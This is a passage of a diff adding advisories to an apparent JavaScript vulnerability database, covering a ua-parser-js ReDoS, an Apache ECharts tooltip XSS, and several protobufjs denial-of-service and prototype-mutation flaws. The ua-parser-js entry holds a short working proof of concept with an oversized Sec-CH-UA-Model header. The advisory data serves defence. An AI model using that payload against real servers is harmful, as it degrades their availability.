+                cwe: [
+                  "CWE-1333",
+                  "CWE-400"
+                ],
+                identifiers: {
+                  summary: "UAParser.js: Unbounded `Sec-CH-UA-Model` parsing can trigger ReDoS in `withClientHints()`",
+                  githubID: "GHSA-9h5v-pfqq-x599",
+                  CVE: [
+                    "CVE-2026-48125"
+                  ]
+                },
+                details: "### Summary\n\nA regular expression denial-of-service (ReDoS) vulnerability has been discovered in `ua-parser-js` when using the Client Hints API. By sending a crafted `Sec-CH-UA-Model` header to an application that calls `UAParser(headers).withClientHints()`, an attacker can cause the parser to spend excessive CPU time due to catastrophic backtracking in the device [regex](https://github.com/faisalman/ua-parser-js/blob/2.0.9/src/main/ua-parser.js#L615):\n\n```js\n/ ([\\w ]+) miui\\/v?\\d/i\n```\n\nUnlike when using the `User-Agent` value, which has a hard limit of `UA_MAX_LENGTH = 500`, when using Client Hints, values are copied without a length limit before being passed into regex parsing.\n\n### PoC\n\n```js\nconst { UAParser } = require('ua-parser-js');\n\nconst headers = {\n  'sec-ch-ua-platform': '\"Android\"',\n  'sec-ch-ua-mobile': '?1',\n  'sec-ch-ua-model': '\"' + 'A '.repeat(25000) + '\"'\n};\n\nconst t0 = process.hrtime.bigint();\nUAParser(headers).withClientHints();\nconst ms = Number(process.hrtime.bigint() - t0) / 1e6;\n\nif (ms > 100) {\n  console.log('Potential ReDoS');\n}\n```\n\n### Impact\n\nThis vulnerability allows an unauthenticated attacker to trigger a denial-of-service condition in any __server-side__ application that uses `UAParser(headers).withClientHints()`. A single request with a ~32,000-character model value can consume over 400ms of CPU time, with parsing time growing polynomially with input length. The impact is __availability__ only, there is no confidentiality or integrity impact.\n\n### Affected Versions\n\n`ua-parser-js` versions `>=2.0.1, <=2.0.9` are affected. The `withClientHints()` API is not present in version `0.7.x` or `1.x`.\n\n### Patches\n\nA patch has been released to fix the vulnerable regular expression and limit the Client Hints input. Users should update to version `2.0.10` or later.\n\n### References\n\n- [Regular expression Denial of Service - ReDoS (OWASP)](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n\n### Credits\n\nThanks to [@sondt99](https://github.com/sondt99), who first reported the issue.",
+                info: [
+                  "https://github.com/faisalman/ua-parser-js/security/advisories/GHSA-9h5v-pfqq-x599"
                 ]
               }
             ],
@@ -24646,7 +26780,32 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
             licenses: [
               "Apache-2.0 >=0"
             ],
-            vulnerabilities: [],
+            vulnerabilities: [
+              {
+                atOrAbove: "0",
+                below: "6.1.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "Apache ECharts has a cross-site scripting (XSS) vulnerability",
+                  githubID: "GHSA-fgmj-fm8m-jvvx",
+                  CVE: [
+                    "CVE-2026-45249"
+                  ]
+                },
+                details: "A cross-site scripting (XSS) vulnerability exists in Apache ECharts in the Lines series tooltip rendering logic.\n\nThis issue affects Apache ECharts: from before 6.1.0.\n\nIn versions prior to 6.1.0, if both Lines series\xA0and tooltip are used, and no user-specified tooltip.formatter is provided, and series.data[i].name is specified, raw HTML string series.data[i].name can be\xA0rendered through innerHTML sink into tooltip content. Although tooltip is allowed to accept user-provided raw HTML via a custom tooltip.formatter, the built-in tooltip formatters conventionally perform HTML escaping automatically. This case breaks that convention and\xA0may unexpectedly lead to script execution when tooltips are displayed.\n\n\nUsers are recommended to upgrade to version 6.1.0 if using the Lines series in this way, which fixes the issue.",
+                info: [
+                  "https://github.com/apache/echarts/pull/21608",
+                  "https://github.com/apache/echarts/commit/1e39b00eedda0e4a0b048e099c0e13ce7149d90f",
+                  "https://echarts.apache.org/en/option.html#series-lines",
+                  "https://echarts.apache.org/handbook/en/best-practices/security/#passing_raw_html_safely",
+                  "https://lists.apache.org/thread/1g6xk7gd9vg1c6zyqqt2lnko10zomc3o",
+                  "http://www.openwall.com/lists/oss-security/2026/05/23/4"
+                ]
+              }
+            ],
             extractors: {
               uri: [
                 "/echarts[@/](\xA7\xA7version\xA7\xA7)/"
@@ -25334,6 +27493,69 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 ]
               },
               {
+                atOrAbove: "0",
+                below: "7.6.1",
+                severity: "high",
+                cwe: [
+                  "CWE-674"
+                ],
+                identifiers: {
+                  summary: "protobufjs: Denial of service through unbounded Any expansion during JSON conversion",
+                  githubID: "GHSA-wcpc-wj8m-hjx6",
+                  CVE: [
+                    "CVE-2026-48712"
+                  ]
+                },
+                details: "## Summary\n\nprotobufjs could recurse without a depth limit while converting decoded messages to plain objects or JSON. This affected generated `toObject()` conversion and the custom `google.protobuf.Any` JSON conversion path.\n\nA crafted protobuf binary payload containing deeply nested `Any` values could cause the JavaScript call stack to be exhausted during conversion to JSON.\n\n## Impact\n\nAn attacker who can provide protobuf binary data decoded by an application may be able to crash the process or otherwise cause message conversion to fail with a stack overflow.\n\nThis affects applications that decode untrusted protobuf input containing `google.protobuf.Any` values and then convert decoded messages to JSON or plain objects with JSON conversion enabled, for example through `JSON.stringify(message)`, `Message#toJSON()`, or `Type.toObject(message, { json: true })`.\n\nApplications that only decode and re-encode protobuf binary data without converting decoded messages to JSON are not directly affected by this issue.\n\n## Preconditions\n\n* The application must decode protobuf binary data influenced by an attacker.\n* The application schema must include `google.protobuf.Any`, and the referenced `type_url` must resolve to a message type in the loaded protobuf root.\n* The application must convert the decoded message to JSON or a plain object through an affected conversion path.\n* The crafted input must contain deeply nested `Any` values that are expanded during conversion.\n\n## Workarounds\n\nAvoid converting untrusted protobuf messages containing `google.protobuf.Any` values to JSON with affected versions. If immediate upgrade is not possible, reject or limit messages with deeply nested `Any` payloads at an outer protocol boundary where feasible, avoid JSON conversion of untrusted `Any` values, or isolate message conversion in a process that can be safely restarted.",
+                info: [
+                  "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-wcpc-wj8m-hjx6"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "7.6.3",
+                severity: "medium",
+                cwe: [
+                  "CWE-674",
+                  "CWE-754"
+                ],
+                identifiers: {
+                  summary: "protobufjs : Schema-derived names can shadow runtime-significant properties",
+                  githubID: "GHSA-f38q-mgvj-vph7",
+                  CVE: [
+                    "CVE-2026-54269"
+                  ]
+                },
+                details: "## Summary\n\nprotobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named `hasOwnProperty`, field or oneof names such as `$type` when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is `rpcCall`.\n\nWhen affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.\n\n## Impact\n\nAn attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.\n\nApplications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.\n\nThe issue is not known to allow code execution by itself.\n\n## Preconditions\n\n* The application must use an affected protobufjs version.\n* The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:\n  * a field named `hasOwnProperty`,\n  * a field or oneof named `$type` through protobufjs JSON/reflection descriptor input,\n  * or a service method whose generated helper name is `rpcCall`.\n* The application must reach the affected API path for that name: required-field decode post-checks, `verify`, or `toObject` for `hasOwnProperty`; reflected message JSON serialization for `$type`; or protobufjs RPC service invocation for `rpcCall`.\n\n## Workarounds\n\nDo not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.\n\nApplications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.",
+                info: [
+                  "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7"
+                ]
+              },
+              {
+                atOrAbove: "7.5.0",
+                below: "7.6.5",
+                severity: "medium",
+                cwe: [
+                  "CWE-835"
+                ],
+                identifiers: {
+                  summary: "protobufjs: Denial of Service via infinite loop in .proto option parsing",
+                  githubID: "GHSA-j3f2-48v5-ccww",
+                  CVE: [
+                    "CVE-2026-59877"
+                  ]
+                },
+                details: "## Summary\n\nprotobufjs parsed option names by advancing through schema tokens until it reached an `=` token, without checking for end of input. A crafted `.proto` schema that opens an option declaration but ends prematurely could cause the option parser to loop without ever terminating.\n\nThis affects the reflection parsing path (`parse`, `Root.load`, `Root.loadSync`).\n\n## Impact\n\nAn attacker who can provide or influence `.proto` schema text parsed by an application may be able to cause the parsing call to never return. Because Node.js is single-threaded, the blocked event loop prevents all other work in the process, resulting in a denial of service that persists until the process is externally terminated.\n\nApplications that only encode or decode protobuf binary data with trusted schemas are not directly affected.\n\n## Preconditions\n\n- The application must parse `.proto` schema text influenced by an attacker.\n- The schema must be parsed through APIs such as `parse`, `Root.load`, or `Root.loadSync`.\n- The crafted input must begin an option declaration that ends before its `=` assignment.\n\n## Workarounds\n\nDo not parse `.proto` schemas from untrusted sources with affected versions. If untrusted schema text must be accepted, isolate parsing in a process or worker that can be safely terminated and bound it with a timeout, so a non-returning parse call cannot deny service to the rest of the application.",
+                info: [
+                  "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-j3f2-48v5-ccww",
+                  "https://github.com/protobufjs/protobuf.js/pull/2352",
+                  "https://github.com/protobufjs/protobuf.js/commit/10fba6d54815ceecca8a06b9a6db490c8f5d2217",
+                  "https://github.com/protobufjs/protobuf.js/commit/fa5c73add738ceb471e74da8cc2f3727c3d0a69f",
+                  "https://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v7.6.5",
+                  "https://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v8.6.6"
+                ]
+              },
+              {
                 atOrAbove: "8.0.0",
                 below: "8.0.1",
                 severity: "critical",
@@ -25521,6 +27743,110 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 details: "## Summary\n\nprotobufjs could recurse without a depth limit while expanding nested JSON descriptors through `Root.fromJSON()` and `Namespace.addJSON()`.\n\nA crafted JSON descriptor with deeply nested namespace definitions could cause the JavaScript call stack to be exhausted during descriptor loading.\n\n## Impact\n\nAn attacker who can provide JSON descriptors loaded by an application may be able to crash the process or otherwise cause schema loading to fail with a stack overflow.\n\nThis affects applications that load JSON descriptors from untrusted sources with affected versions.\n\n## Preconditions\n\n- The application must load JSON descriptor data influenced by an attacker.\n- The crafted descriptor must contain deeply nested `nested` namespace objects.\n- The affected `Root.fromJSON()` / `Namespace.addJSON()` descriptor expansion path must process the crafted input.\n\n## Workarounds\n\nAvoid loading untrusted protobuf JSON descriptors with affected versions. If immediate upgrade is not possible, reject excessively nested descriptor structures at an outer validation boundary where feasible, or isolate descriptor loading in a process that can be safely restarted.",
                 info: [
                   "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-jggg-4jg4-v7c6"
+                ]
+              },
+              {
+                atOrAbove: "8.0.0",
+                below: "8.4.1",
+                severity: "high",
+                cwe: [
+                  "CWE-674"
+                ],
+                identifiers: {
+                  summary: "protobufjs: Denial of service through unbounded Any expansion during JSON conversion",
+                  githubID: "GHSA-wcpc-wj8m-hjx6",
+                  CVE: [
+                    "CVE-2026-48712"
+                  ]
+                },
+                details: "## Summary\n\nprotobufjs could recurse without a depth limit while converting decoded messages to plain objects or JSON. This affected generated `toObject()` conversion and the custom `google.protobuf.Any` JSON conversion path.\n\nA crafted protobuf binary payload containing deeply nested `Any` values could cause the JavaScript call stack to be exhausted during conversion to JSON.\n\n## Impact\n\nAn attacker who can provide protobuf binary data decoded by an application may be able to crash the process or otherwise cause message conversion to fail with a stack overflow.\n\nThis affects applications that decode untrusted protobuf input containing `google.protobuf.Any` values and then convert decoded messages to JSON or plain objects with JSON conversion enabled, for example through `JSON.stringify(message)`, `Message#toJSON()`, or `Type.toObject(message, { json: true })`.\n\nApplications that only decode and re-encode protobuf binary data without converting decoded messages to JSON are not directly affected by this issue.\n\n## Preconditions\n\n* The application must decode protobuf binary data influenced by an attacker.\n* The application schema must include `google.protobuf.Any`, and the referenced `type_url` must resolve to a message type in the loaded protobuf root.\n* The application must convert the decoded message to JSON or a plain object through an affected conversion path.\n* The crafted input must contain deeply nested `Any` values that are expanded during conversion.\n\n## Workarounds\n\nAvoid converting untrusted protobuf messages containing `google.protobuf.Any` values to JSON with affected versions. If immediate upgrade is not possible, reject or limit messages with deeply nested `Any` payloads at an outer protocol boundary where feasible, avoid JSON conversion of untrusted `Any` values, or isolate message conversion in a process that can be safely restarted.",
+                info: [
+                  "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-wcpc-wj8m-hjx6"
+                ]
+              },
+              {
+                atOrAbove: "8.2.0",
+                below: "8.5.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-770"
+                ],
+                identifiers: {
+                  summary: "protobufjs: Memory amplification from preserved unknown fields in binary decode",
+                  githubID: "GHSA-94rc-8x27-4472",
+                  CVE: [
+                    "CVE-2026-54270"
+                  ]
+                },
+                details: "## Summary\n\nprotobufjs 8.2.0 added support for preserving unknown fields encountered during binary decode. Affected versions preserved unknown wire elements in `message.$unknowns` and did not provide a decode-time option to discard unknown fields before retaining them.\n\nA crafted protobuf payload containing many unknown fields could therefore cause a decoded message to retain substantially more memory than the input size would suggest, even when unknown-field round-tripping is not needed. protobufjs 8.5.0 added the relevant decode-time options, allowing applications that decode untrusted protobuf data to disable unknown-field retention during decode. protobufjs 8.6.2 flips the default so unknown fields are discarded unless explicitly opted into.\n\n## Impact\n\nAn attacker who can provide protobuf binary data decoded by an application using affected protobufjs versions may be able to increase memory pressure by sending messages with many unknown fields. This can degrade availability or contribute to process termination in services that decode and retain attacker-controlled messages.\n\nThis issue affects applications that decode untrusted protobuf binary input and do not need unknown-field round-tripping. Applications that only decode trusted protobuf data, already enforce input-size/concurrency limits, or do not retain decoded messages beyond immediate processing are less directly affected.\n\n## Preconditions\n\n* The application must decode protobuf binary data influenced by an attacker.\n* The decoded schema must not define the attacker-selected field numbers, causing those fields to be treated as unknown.\n* The application must use a protobufjs version that preserves unknown fields but does not provide a decode-time discard option.\n* The decoded message, or enough decoded messages concurrently, must remain live long enough for retained unknown-field data to affect memory usage.\n\n## Workarounds\n\nUpgrade to protobufjs 8.5.0 or newer and disable unknown-field preservation if not needed: Create a `Reader`, set `reader.discardUnknown = true`, and decode from that reader, or make this the default for subsequently created readers by setting `Reader.discardUnknown = true`. When upgrading to protobufjs 8.6.2 or newer, unknown fields are discarded by default unless opted into by setting `discardUnknown = false`.\n\nApplications should also continue to enforce input-size, request concurrency, and request timeout limits at their transport or application boundary.",
+                info: [
+                  "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-94rc-8x27-4472"
+                ]
+              },
+              {
+                atOrAbove: "8.0.0",
+                below: "8.6.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-674",
+                  "CWE-754"
+                ],
+                identifiers: {
+                  summary: "protobufjs : Schema-derived names can shadow runtime-significant properties",
+                  githubID: "GHSA-f38q-mgvj-vph7",
+                  CVE: [
+                    "CVE-2026-54269"
+                  ]
+                },
+                details: "## Summary\n\nprotobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named `hasOwnProperty`, field or oneof names such as `$type` when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is `rpcCall`.\n\nWhen affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.\n\n## Impact\n\nAn attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.\n\nApplications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.\n\nThe issue is not known to allow code execution by itself.\n\n## Preconditions\n\n* The application must use an affected protobufjs version.\n* The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:\n  * a field named `hasOwnProperty`,\n  * a field or oneof named `$type` through protobufjs JSON/reflection descriptor input,\n  * or a service method whose generated helper name is `rpcCall`.\n* The application must reach the affected API path for that name: required-field decode post-checks, `verify`, or `toObject` for `hasOwnProperty`; reflected message JSON serialization for `$type`; or protobufjs RPC service invocation for `rpcCall`.\n\n## Workarounds\n\nDo not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.\n\nApplications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.",
+                info: [
+                  "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7"
+                ]
+              },
+              {
+                atOrAbove: "8.2.0",
+                below: "8.6.5",
+                severity: "medium",
+                cwe: [
+                  "CWE-1321"
+                ],
+                identifiers: {
+                  summary: "protobufjs: Text Format string map parsing can mutate returned map object prototype",
+                  githubID: "GHSA-jfj6-75fj-8934",
+                  CVE: [
+                    "CVE-2026-59876"
+                  ]
+                },
+                details: "## Summary\n\nThe protobuf.js text format extension parsed string-keyed map entries using ordinary property assignment. A text-format map entry with key `__proto__` could therefore change the prototype of the returned map object instead of creating an own map entry.\n\nThis affected the optional Text Format extension. Other protobufjs input paths, including binary decode, `fromObject`, and ProtoJSON conversion, are not affected.\n\n## Impact\n\nAn attacker who can provide protobuf text-format input parsed by an application using `protobufjs/ext/textformat` may be able to create message objects whose string-keyed map fields have attacker-controlled prototypes.\n\nThis is per-object prototype mutation, not global `Object.prototype` pollution. Impact depends on downstream application logic treating inherited properties as meaningful, for example by using `in`, truthiness checks, or direct property access on parsed map objects instead of own-property checks.\n\nApplications that do not parse untrusted Text Format input, or that do not use inherited properties from parsed map objects in security-relevant logic, are not directly affected.\n\n## Preconditions\n\n* The application must parse attacker-controlled protobuf Text Format input with `protobufjs/ext/textformat`.\n* The target schema must contain a string-keyed map field.\n* The crafted input must provide a map entry with key `__proto__`.\n* Downstream application logic must treat inherited properties on the returned map object as meaningful for impact beyond malformed output.\n\n## Workarounds\n\nUpgrade to protobufjs 8.6.5 or newer.\n\nIf immediate upgrade is not possible, do not parse untrusted protobuf Text Format input with affected versions. Applications can also reject string map keys named `__proto__` before or during Text Format parsing, and should use own-property checks such as `Object.hasOwnProperty.call(map, key)` when consuming parsed map objects.",
+                info: [
+                  "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-jfj6-75fj-8934",
+                  "https://github.com/protobufjs/protobuf.js/pull/2335",
+                  "https://github.com/protobufjs/protobuf.js/commit/9f97fe413072d3beb52c74e62d88ea8adc9444d8",
+                  "https://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v8.6.5"
+                ]
+              },
+              {
+                atOrAbove: "8.0.0",
+                below: "8.6.6",
+                severity: "medium",
+                cwe: [
+                  "CWE-835"
+                ],
+                identifiers: {
+                  summary: "protobufjs: Denial of Service via infinite loop in .proto option parsing",
+                  githubID: "GHSA-j3f2-48v5-ccww",
+                  CVE: [
+                    "CVE-2026-59877"
+                  ]
+                },
+                details: "## Summary\n\nprotobufjs parsed option names by advancing through schema tokens until it reached an `=` token, without checking for end of input. A crafted `.proto` schema that opens an option declaration but ends prematurely could cause the option parser to loop without ever terminating.\n\nThis affects the reflection parsing path (`parse`, `Root.load`, `Root.loadSync`).\n\n## Impact\n\nAn attacker who can provide or influence `.proto` schema text parsed by an application may be able to cause the parsing call to never return. Because Node.js is single-threaded, the blocked event loop prevents all other work in the process, resulting in a denial of service that persists until the process is externally terminated.\n\nApplications that only encode or decode protobuf binary data with trusted schemas are not directly affected.\n\n## Preconditions\n\n- The application must parse `.proto` schema text influenced by an attacker.\n- The schema must be parsed through APIs such as `parse`, `Root.load`, or `Root.loadSync`.\n- The crafted input must begin an option declaration that ends before its `=` assignment.\n\n## Workarounds\n\nDo not parse `.proto` schemas from untrusted sources with affected versions. If untrusted schema text must be accepted, isolate parsing in a process or worker that can be safely terminated and bound it with a timeout, so a non-returning parse call cannot deny service to the rest of the application.",
+                info: [
+                  "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-j3f2-48v5-ccww",
+                  "https://github.com/protobufjs/protobuf.js/pull/2352",
+                  "https://github.com/protobufjs/protobuf.js/commit/10fba6d54815ceecca8a06b9a6db490c8f5d2217",
+                  "https://github.com/protobufjs/protobuf.js/commit/fa5c73add738ceb471e74da8cc2f3727c3d0a69f",
+                  "https://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v7.6.5",
+                  "https://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v8.6.6"
                 ]
               }
             ],
